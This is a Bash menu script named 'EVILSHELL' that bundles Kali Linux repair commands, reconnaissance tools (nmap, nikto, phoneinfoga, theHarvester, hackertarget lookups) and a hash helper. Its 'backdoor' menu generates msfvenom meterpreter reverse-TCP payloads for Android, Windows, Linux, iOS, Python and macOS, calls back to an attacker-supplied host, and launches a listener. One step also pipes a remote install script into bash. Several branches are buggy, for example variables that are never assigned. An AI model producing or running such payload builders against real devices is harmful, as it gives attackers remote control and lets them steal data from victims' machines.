
clear


#This is Blod color
green='\e[1;32m'
cyan='\e[1;36m'
red='\e[1;31m'
blue='\e[1;34m'
white='\e[1;37m'
yellow='\e[1;33m'
purple='\e[1;35m'
##################
clear
echo -e $green
echo  "                                                                      ";
echo  "                                                                      ";
echo  "            /EE    /EE /EE /EE           /EE                 /EE /EE  ";
echo  "           | EE   | EE|__/| EE          | EE                | EE| EE  ";
echo  "   /EEEEEE | EE   | EE /EE| EE  /EEEEEEE| EEEEEEE   /EEEEEE | EE| EE  ";
echo  "  /EE__  EE|  EE / EE/| EE| EE /EE_____/| EE__  EE /EE__  EE| EE| EE  ";
echo  " | EEEEEEE \  EE EEE/ | EE| EE|  EEEEEE | EE  \ EE| EEEEEEEE| EE| EE  ";
echo  " | EE_____/  \  EE$/  | EE| EE \____  EE| EE  | EE| EE_____/| EE| EE  ";
echo  " |  EEEEEEE   \  $/   | EE| EE /EEEEEEE/| EE  | EE|  EEEEEEE| EE| EE  ";
echo  "  \_______/    \_/    |__/|__/|_______/ |__/  |__/ \_______/|__/|__/  ";
echo  "                                                                      ";
echo  "                     BY IDRISSI HAITAM -_-                            ";
echo  "                                                                      ";
echo  "         Your comprehensive toolkit for Kali Linux repair,            ";
echo  "            information gathering, and exploitation tasks.            ";
echo  "       Crafted by Idrissi Haitam, this script is designed to          ";
echo  "        streamline your workflow with a user-friendly interface,      ";
echo  "        ensuring you have the tools you need at your fingertips.      ";

echo ""                                                                      

echo ""
echo -e $white "                     Please Press Enter To Start the EVILSHELL  "
read Enter
clear
figlet " Welcome TO EVILSHELL CREATED BY HAITAMIDRISSI " | lolcat
echo -e $red "                  $purple<<<$white The Script By: IDRISSI HAITAM$purple >>>"
echo ''
echo -e $white "         --------------------------------------------------"
echo ''
echo -e $red "1-   "$white" #### REPAIR KALI LINUX #### : try to adjust your KALI LINUX"  
echo
echo -e $red "2-   "$white" ##### GIVE ME INFORMATIONS ####: Collecting INFORMATIONS"
echo
echo -e $red "3-   "$white" #### IM HACKING YOU :) ##### : Create Payload Metasploit"
echo
echo -e $red "4-   "$white" ######### DECRYPTING ########"
echo
echo -e $red "5-   "$white" EXIT THE SCRIPT"
echo
read -p "Enter the Number: " SY
######################################
if [ "$SY" = 0 ]
then
clear
figlet " GOOD BYE  " | lolcat
fi
######################################
if [ "$SY" = 1 ]
then
clear
echo ""
figlet "KALI REPAIR" | lolcat
echo -e $yellow
echo -e  "1-    ######## UPDATE SOURCE LIST ##########"
echo -e  "2-    ######## UPGRADE SYSTEM KALI #########"
echo -e  "3-    ######## CLEANING AND UPDATING KALI LINUX ######## "
echo -e  "4-    ######### COPYING AND ZOOM PROBLEM SOLVING (VMware) #######"
echo -e  "5-    GO BACK "
echo ""
read -p "Choose the problem number :" Update
if [ $Update = 5 ]
then
clear
bash M2.sh
fi
if [ $Update = 1 ]
then
clear
echo -e $red"Installing the Sorcerer Please wait..."
sleep 2
rm /etc/apt/sources.list
echo "deb http://http.kali.org/kali sana main non-free contrib" >> /etc/apt/sources.list
echo "deb http://security.kali.org/kali-security sana/updates main contrib non-free" >> /etc/apt/sources.list
echo "deb-src http://http.kali.org/kali sana main non-free contrib" >> /etc/apt/sources.list
echo "deb-src http://security.kali.org/kali-security sana/updates main contrib non-free" >> /etc/apt/sources.list
echo "deb http://http.kali.org/kali kali-rolling main contrib non-free" >> /etc/apt/sources.list
echo "deb http://security.kali.org/kali-security kali-rolling/updates main contrib non-free" >> /etc/apt/sources.list
apt-get update
apt-get upgrade
clear
echo ""
echo -e $green "OPERATING SUCCESSFULLY !!!"
echo ""
echo ""
fi
if [ $Update = 2 ]
then
clear
echo -e $green "Upgrading the KALI Please wait..."
sleep 2
apt-get update
apt-get dist-upgrade
clear
echo ""
echo -e $green "KALI upgraded !!!"
echo ""
echo ""
fi
if [ $Update = 3 ]
then
clear
echo -e $green " cleaning and updating KALI LINUX, Please wait..."
sleep 2
apt-get update && apt-get -y dist-upgrade && apt-get autoremove -y && apt-get -y autoclean
clear
echo ""
echo -e $green "Kali has been successfully cleaned and updated !!!"
echo ""
echo ""
fi
if [ $Update = 6 ]
then
clear
echo -e $green "The audio problem is being fixed Please wait..."
sleep 2
systemctl --user enable pulseaudio && systemctl --user start pulseaudio
clear
echo -e $blue "<><><><><><><><><><><><><><><><><><><><><><><><><>"
echo ""
echo -e $green "The sound problem has been successfully fixed !!!"
echo ""
echo -e $blue "<><><><><><><><><><><><><><><><><><><><><><><><><>"
echo ""
fi
if [ $Update = 9 ]
then
clear
echo -e $green "Bluetooth is fixed Please wait..."
sleep 2
sudo lsmod | grep blue
systemctl enable bluetooth.service
systemctl start bluetooth.service
clear
echo -e $blue "<><><><><><><><><><><><><><><><><><><><><><><><><><><><><>"
echo ""
echo -e $green "The Bluetooth problem has been successfully resolved !!!"
echo ""
echo -e $blue "<><><><><><><><><><><><><><><><><><><><><><><><><><><><><>"
echo ""
fi
if [ $Update = 68 ]
then
clear
echo -e $green "All VPN problems are fixed Please wait..."
sleep 2
apt-get install network-manager-openvpn-gnome
apt-get install network-manager-pptp
apt-get install network-manager-pptp-gnome
apt-get install network-manager-strongswan
apt-get install network-manager-vpnc
apt-get install network-manager-vpnc-gnome
/etc/init.d/network-manager restart
clear
echo -e $blue "<><><><><><><><><><><><><><><><><><><><><><><><><><><>"
echo ""
echo -e $green "All VPN problems have been successfully resolved !!!"
echo ""
echo -e $blue "<><><><><><><><><><><><><><><><><><><><><><><><><><><>"
echo ""
fi
if [ $Update = 4 ]
then
clear
echo -e $green "copying problem is resolved and screen magnification Please wait..."
sleep 2
apt-get install open-vm-tools-desktop fuse
clear
echo ""
echo -e $green "The copy issue and screen magnification have been successfully resolved !!!"
echo ""
echo ""
fi
fi
######################################
if [ "$SY" = 2 ]
then
clear
figlet "I N F O R M A T I O N" | lolcat
echo ''
echo -e $red"1-$blue INFOPHONE                       |            $red   7-$green GOLISMERO"
echo ""
echo -e $red"2-$blue MMALTEGOO                       |          $red     8-$green NMAP DETECTION"
echo ""
echo -e $red"3-$blue WHATWEB                         |       $red        9-$green WORDLIST"
echo ""
echo -e $red"4-$blue DMITRY                          |  $red            10-$green Wa PITI"
echo ""
echo -e $red"5-$blue THEHAVEST                       |   $red           11-$green HHTTACK"
echo ""
echo -e $red"6-$blue NIKTO                           |     $red         12-$green DEVICEInformationS"
echo ""
echo -e $red"99-$blue BACK"
echo
read -p "Entre The Number: " name
if [ $name = 99 ]
then
clear
bash M2.sh
fi
if [ $name = 1 ]
then
clear
figlet "I N F O P H O N E" | lolcat
echo -e $purple
echo "  One of the best tools for collecting information about mobile phone numbers,            ";
echo "    such as the country, line type, and the number's activity on social media in general. ";
echo "                                                                                          ";
echo -e $red
echo ""
echo -e $white "{1}- Installation tool phoneinfoga"
echo ""
echo -e $white "{2}- Start collecting information"
echo ""
echo -e $whtie " {3}- Back"
echo ""
echo ""
read phone
if [ $phone = 1 ]
then
echo ""
echo ""
echo "Please wait a little..."
sleep 2
curl -sSL https://raw.githubusercontent.com/sundowndev/phoneinfoga/master/support/scripts/install | bash
sudo mv ./phoneinfoga /usr/bin/phoneinfoga
fi
if [ $phone = 2 ]
then
echo "Enter the number you want to search for"
echo ""
echo ""
read number
sleep 2
phoneinfoga -n $number
fi
if [ $phone = 3 ]
then
clear
bash M2.sh
fi
fi
if [ $name = 2 ]
then
clear
figlet "M M A L T E G O O" | lolcat
echo -e $yellow
echo ""
echo " It is one of the best and most powerful tools             ";
echo " in collecting information on all levels, sites.           ";
echo "                                                           ";
echo -e $red
echo ""
echo -e $white "{1}- Installation tool Maltego"
echo ""
echo -e $white "{2}- Open Maltego"
echo ""
echo -e $white "{3}- Back"
echo ""
echo ""
echo ""
read MALTEGO
if [ $MALTEGO = 00 ]
then
clear
bash M2.sh
fi
if [ $MALTEGO = 1 ]
then
echo ""
echo ""
echo "Please wait a little..."
sleep 2
apt-get install maltego
fi
if [ $MALTEGO = 2 ]
then
echo ""
echo ""
echo "Loading..."
sleep 2
open maltego
fi
if [ $MALTEGO = 3 ]
then
clear
bash M2.sh
fi
fi
if [ $name = 3 ]
then
clear
figlet "W H A T  W E B" | lolcat
echo -e $green
echo ""
echo "  This tool is one of the easiest tools as it brings         ";
echo " important information and details accurately and easily     ";
echo "                                                             ";
echo -e $red
echo ""
echo -e $white "{1}- Installation tool Whatweb"
echo ""
echo -e $white "{2}- Start collecting information"
echo ""
echo -e $white "{3}- Back"
echo ""
echo ""
echo ""
read WHATWEB
if [ $WHATWEB = 1 ]
then
echo "Please wait a little..."
echo ""
echo ""
sleep 2
apt-get install whatweb
fi
if [ $WHATWEB = 2 ]
then
echo "Please the location you want to check"
echo ""
echo ""
read url
sleep 2
whatweb -v $url
fi
if [ $WHATWEB = 3 ]
then
clear
bash M2.sh
fi
fi
if [ $name = 4 ]
then
clear
figlet "D M I T R Y" | lolcat
echo -e $red
echo ""
echo -e $white "{1}- Installation tool Dmitry"
echo ""
echo -e $white "{2}- Start by checking the site"
echo ""
echo -e $white "{3}- Start checking the domain associated with the site"
echo ""
echo -e $white "{4}- Back"
echo ""
echo ""
echo ""
echo ""
read DMITRY
if [ $DMITRY = 1 ]
then
echo "Please wait a little..."
echo ""
echo ""
sleep 2
apt-get install dmitry
fi
if [ $DMITRY = 2 ]
then
echo "Please the location you want to check"
echo ""
echo ""
read url
sleep 2
dmitry -i $url
fi
if [ $DMITRY = 3 ]
then
echo "Please the location you want to check"
echo ""
echo ""
read url
sleep 2
dmitry -s $url
fi
if [ $DMITRY = 4 ]
then
clear
bash M2.sh
fi
fi
if [ $name = 5 ]
then
clear
figlet "T H E  HARVEST" | lolcat
echo -e $red
echo ""
echo -e $white "{1}- Installation tool Theharvester"
echo ""
echo -e $white "{2}- Start collecting information"
echo ""
echo -e $white "{3}- Back"
echo ""
echo ""
read THEHARVESTER
if [ $THEHARVESTER = 1 ]
then
echo "Please wait a little..."
echo ""
echo ""
sleep 2
apt-get install theharvester
fi
if [ $THEHARVESTER = 2 ]
then
echo "Please the location you want to check"
echo ""
echo ""
read url
sleep 2
theharvester -d $url -l 500 -b google
fi
if [ $THEHARVESTER = 3 ]
then
clear
bash M2.sh
fi
fi
if [ $name = 6 ]
then
clear
figlet "N I K T O" | lolcat
echo -e $cyan
echo ""
echo "  This tool extracts vulnerable holes. ";
echo "                                       ";
echo -e $red
echo ""
echo -e $white "1- Installation tool Nikto"
echo ""
echo -e $white "2- Start by checking"
echo ""
echo -e $white "3- Back"
echo ""
echo ""
read NIKTO
if [ $NIKTO = 1 ]
then
echo "Please wait a little..."
echo ""
echo ""
sleep 2
apt-get install nikto
fi
if [ $NIKTO = 2 ]
then
echo "Please enter the IP address"
echo ""
echo ""
read IP
nikto -h $IP
fi
if [ $NIKTO = 3 ]
then
clear
bash M2.sh
fi
fi
if [ $name = 7 ]
then
clear
figlet "G O L I S M E E R O" | lolcat
echo "                                                                         ";
echo -e $red
echo ""
echo -e $white "1- Installation tool Golismero"
echo ""
echo -e $white "2- Start collecting information"
echo ""
echo -e $white "3- Back"
echo ""
echo ""
read GOLISMERO
if [ $GOLISMERO = 1 ]
then
echo "Please wait a little..."
echo ""
echo ""
sleep 2
apt-get install golismero
fi
if [ $GOLISMERO = 2 ]
then
echo "Please the location you want to check"
echo ""
echo ""
read url
golismero scan $url
fi
if [ $GOLISMERO = 3 ]
then
clear
bash M2.sh
fi
fi
if [ $name = 9 ]
then
clear
figlet "W O R D L I S T" | lolcat
echo "                                                               ";
echo -e $red
echo -e $white "How many characters and numbers you want to enter?"
echo ""
echo ""
read number
echo "-----------------------"
echo -e $white "Characters Numbers Symbols?"
echo ""
echo ""
read WORD
wordlist -m $number -M $number -o /root/Desktop/Password.txt $WORD
fi
if [ $name = 10 ]
then
clear
echo -e $red
echo ""
echo "██╗    ██╗ █████╗ ██████╗ ██╗████████╗██╗";
echo "██║    ██║██╔══██╗██╔══██╗██║╚══██╔══╝██║";
echo "██║ █╗ ██║███████║██████╔╝██║   ██║   ██║";
echo "██║███╗██║██╔══██║██╔═══╝ ██║   ██║   ██║";
echo "╚███╔███╔╝██║  ██║██║     ██║   ██║   ██║";
echo " ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝     ╚═╝   ╚═╝   ╚═╝";
echo "                                         ";
echo -e $red
echo ""
echo -e $white "{1}- Installation tool Wapiti"
echo ""
echo -e $white "{2}- Start by checking the site"
echo ""
echo -e $white "{3}- Back"
echo ""
echo ""
read WAPITI
if [ $WAPITI = 1 ]
then
echo "Please wait a little..."
echo ""
echo ""
sleep 2
apt-get install wapiti
fi
if [ $WAPITI = 2 ]
then
echo "Please the location you want to check"
echo ""
echo ""
read url
wapiti $url
fi
if [ $WAPITI = 3 ]
then
clear
bash M2.sh
fi
fi
if [ $name = 11 ]
then
clear
echo -e $yellow
echo ""
echo "██╗  ██╗████████╗████████╗██████╗  █████╗  ██████╗██╗  ██╗";
echo "██║  ██║╚══██╔══╝╚══██╔══╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝";
echo "███████║   ██║      ██║   ██████╔╝███████║██║     █████╔╝ ";
echo "██╔══██║   ██║      ██║   ██╔══██╗██╔══██║██║     ██╔═██╗ ";
echo "██║  ██║   ██║      ██║   ██║  ██║██║  ██║╚██████╗██║  ██╗";
echo "╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝";
echo "                                                          ";
echo -e $red
echo ""
echo -e $white "{1}- Installation tool Httrack"
echo ""
echo -e $white "{2}- Open Httrack"
echo ""
echo -e $white "{3}- Back"
echo ""
echo ""
read HTTRACK
if [ $HTTRACK = 1 ]
then
echo "Please wait a little..."
echo ""
echo ""
sleep 2
apt-get install httrack
fi
if [ $HTTRACK = 2 ]
then
httrack
fi
if [ $HTTRACK = 3 ]
then
clear
bash M2.sh
fi
fi
if [ $name = 8 ]
then
clear
echo -e $red
echo ""
echo "███╗   ██╗███╗   ███╗ █████╗ ██████╗ ";
echo "████╗  ██║████╗ ████║██╔══██╗██╔══██╗";
echo "██╔██╗ ██║██╔████╔██║███████║██████╔╝";
echo "██║╚██╗██║██║╚██╔╝██║██╔══██║██╔═══╝ ";
echo "██║ ╚████║██║ ╚═╝ ██║██║  ██║██║     ";
echo "╚═╝  ╚═══╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝     ";
echo "best tool of network collection data ";
echo -e $red
echo ""
echo -e $white "{1}- Installation tool Nmap"
echo ""
echo -e $white "{2}- Start by checking the site"
echo ""
echo -e $white "{3}- Back"
echo ""
echo ""
read NMAP
if [ $NMAP = 1 ]
then
echo "Please wait a little..."
echo ""
echo ""
sleep 2
apt-get install nmap
fi
if [ $NMAP = 2 ]
then
echo""
echo "Please place the IP address you want to check"
echo ""
echo ""
read IP
clear
echo -e "Nmap scan for:"
echo ""
echo -e "{1}- Simple Scan [-sV]"
echo ""
echo -e "{2}- Port Scan [-Pn]"
echo ""
echo -e "{3}- Operating System Detection [-A]"
echo ""
echo -e "{4}- Back"
echo ""
echo ""
read scan
if [ "$scan" = 1 ]
then
nmap -sV $IP
fi
if [ "$scan" = 2 ]
then
nmap -Pn $IP
fi
if [ "$scan" = 3 ]
then
nmap -A $IP
fi
if [ "$scan" = 4 ]
then
clear
bash M2.sh
fi
fi
if [ $NMAP = 3 ]
then
clear
bash M2.sh
fi
fi
fi
######################################
if [ "$name" = 12 ]
then
clear
echo -e $red
figlet -f Swan "Inforamtion"
echo
echo -e $red"{$blue 1$red }$white MY IP ADDRESS"
echo
echo -e $red"{$blue 2$red }$white INFORMATION IP AND SITE"
echo
echo -e $red"{$blue 3$red }$white DNS HOST FINDER"
echo
echo -e $red"{$blue 6$red }$white DOMAIN INFORMATION"
echo
echo -e $red"{$blue 7$red }$white LINKS EXTRACTION"
echo
echo -e $red"{$blue 0$red }$white GO BACK"
echo
echo
read -p "Enter The Number: " ipp
if [ $ipp = 1 ]
then
echo -e $cyan
ip=$(curl -s https://api.ipify.org)
echo "My public IP address is: $ip"
echo
echo -e $blue
read -p "Preas Any Kay To The Back" enter
bash M2.sh
fi
if [ $ipp = 2 ]
then
echo
read -p "Enter The Ip or site: " ip
curl http://ip-api.com/$ip
echo
echo -e $blue
read -p "Preas Any Kay To The Back" enter
bash M2.sh
fi
if [ $ipp = 3 ]
then
echo
read -p "Enter The Site: " site
curl https://api.hackertarget.com/mtr/?q=$site
echo
echo -e $blue
read -p "Preas Any Kay To The Back" enter
bash M2.sh
fi
if [ $ipp = 4 ]
then
echo
read -p "Enter The Ip or Site: " port
curl http://api.hackertarget.com/nmap/?q=$port
echo
echo -e $blue
read -p "Preas Any Kay To The Back" enter
bash M2.sh
fi
if [ $ipp = 5 ]
then
echo
read -p "Enter The Site: " s
s=$(curl -s http://api.hackertarget.com/hostsearch/?q=$s)
echo "The host is: $s"
echo
echo -e $blue
read -p "Preas Any Kay To The Back" enter
bash M2.sh
fi
if [ $ipp = 6 ]
then
echo
read -p 'Enter The domain: ' mail
curl -H "Accept: application/json" \
https://check-host.net/check-tcp?host=smtp://$mail&max_nodes=1
echo
echo -e $blue
echo
echo
read -p "Preas Any Kay To The Back" enter
bash M2.sh
fi
if [ $ipp = 7 ]
then
echo
read -p "Enter The domain: " df
echo -e $red
curl https://api.hackertarget.com/pagelinks/?q=$df
echo
echo -e $blue
read -p "Preas Any Kay To The Back" enter
bash M2.sh
fi
if [ $ipp = 0 ]
then
clear
bash M2.sh
fi
fi
######################################
if [ "$SY" = 3 ]
then
clear
echo -e $red
echo "███╗   ███╗███████╗████████╗ █████╗ ███████╗██████╗ ██╗      ██████╗ ██╗████████╗";
echo "████╗ ████║██╔════╝╚══██╔══╝██╔══██╗██╔════╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝";
echo "██╔████╔██║█████╗     ██║   ███████║███████╗██████╔╝██║     ██║   ██║██║   ██║   ";
echo "██║╚██╔╝██║██╔══╝     ██║   ██╔══██║╚════██║██╔═══╝ ██║     ██║   ██║██║   ██║   ";
echo "██║ ╚═╝ ██║███████╗   ██║   ██║  ██║███████║██║     ███████╗╚██████╔╝██║   ██║   ";
echo "╚═╝     ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   ";
echo "    HACK TOOLS THAT CREATES A BACKDOOR                                                                             ";
echo
echo -e $red"1-"$green" Payload Android"
echo
echo -e $red"2-"$green" Payload Windows"
echo
echo -e $red"3-"$green" Payload Linux"
echo
echo -e $red"4-"$green" Payload Iso"
echo
echo -e $red"5-"$green" Payload Python"
echo
echo -e $red"0-"$green" Back"
echo
read -p "Enter the Number: " payload
if [ $payload = 0 ]
then
clear
bash M2.sh
fi
if [ $payload = 1 ]
then
echo
read -p "Enter The Host: " host
read -p "Enter The Port: " port
read -p "Enter the Name: " name
msfvenom -p android/meterpreter/reverse_tcp LHOST=$host LPORT=$port R > /root/Desktop/$name.apk
msfconsole -x 'use exploit/multi/handler' -x 'set payload android/meterpreter/reverse_tcp'
fi
if [ $payload = 2 ]
then
echo
read -p "Enter The Host: " host
read -p "Enter The Port: " port
read -p "Enter the Name: " name
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$host LPORT=$port -f exe -o /root/Desktop/$name.exe
msfconsole -x 'use exploit/multi/handler' -x 'set payload windows/meterpreter/reverse_tcp'
fi
if [ $payload = 3 ]
then
echo
read -p "Enter The Host: " host
read -p "Enter The Port: " port
read -p "Enter the Name: " name
msfvenom -p linux/x86/meterpreter/reverse_tcp -f elf LHOST=$host LPORT=$port -o /root/Desktop/$name.elf
msfconsole -x 'use exploit/multi/handler' -x 'set payload linux/x86/meterpreter/reverse_tcp'
fi
if [ $payload = 4 ]
then
echo
read -p "Enter The Host: " host
read -p "Enter The Port: " port
read -p "Enter the Name: " name
msfvenom -p apple_ios/aarch64/meterpreter_reverse_tcp LHOST=$host LPORT=$port -o /root/Desktop/$name.api
msfconsole -x 'use exploit/multi/handler' -x 'set payload apple_ios/aarch64/meterpreter_reverse_tcp'
fi
if [ $payload = 5 ]
then
echo
read -p "Enter The Host: " host
read -p "Enter The Port: " port
read -p "Enter the Name: " name
msfvenom -f raw -p python/meterpreter/reverse_tcp LHOST=$host LPORT=$port R> /root/Desktop/$name.py
msfconsole -x 'use exploit/multi/handler' -x 'set payload python/meterpreter/reverse_tcp'
fi
if [ $payload = 6 ]
then
echo
read -p "Enter The Host: " host
read -p "Enter The Port: " port
read -p "Enter the Name: " name
msfvenom -p osx/x64/meterpreter_reverse_tcp -f macho LHOST=$host LPORT=$port -o /root/Desktop/$name.macho
msfconsole -x 'use exploit/multi/handler' -x 'set payload osx/x64/meterpreter_reverse_tcp'
fi
fi
######################################
if [ "$SY" = 4 ]
then
clear
echo -e $red "Select the type of tick that you want to encrypt"
echo -e $green
echo "1- md5            |       4- sha512             "
echo "2- sha1           |       5- sha256             "
echo "3- sha224         |       6- sha384             "
echo "0- Back"
echo ""
read hash
if [ $hash = 1 ]
then
echo "Enter the word to encrypt"
read $name1
echo "$name1" | md5sum
echo -e $red
read -p 'Enter any kay to back' a
fi
###############################
if [ $hash = 2 ]
then
echo "Enter the word to encrypt"
read $name2
echo "$name2" | sha1sum
echo -e $red
read -p 'Enter any kay to back' a
fi
###############################
if [ $hash = 3 ]
then
echo "Enter the word to encrypt"
read $name3
echo "name3" | sha224sum
echo -e $red
read -p 'Enter any kay to back' a
fi
###############################
if [ $hash = 4 ]
then
echo "Enter the word to encrypt"
read $name4
echo "$name4" | sha512sum
echo -e $red
read -p 'Enter any kay to back' a
fi
###############################
if [ $hash = 5 ]
then
echo "Enter the word to encrypt"
read $name5
echo "$name5" | sha256sum
echo -e $red
read -p 'Enter any kay to back' a
fi
###############################
if [ $hash = 6 ]
then
echo "Enter the word to encrypt"
read $name6
echo "$name6" | sha384sum
echo -e $red
read -p 'Enter any kay to back' a
fi
if [ $hash = 0 ]
then
clear
bash M2.sh
fi
fi
###############################

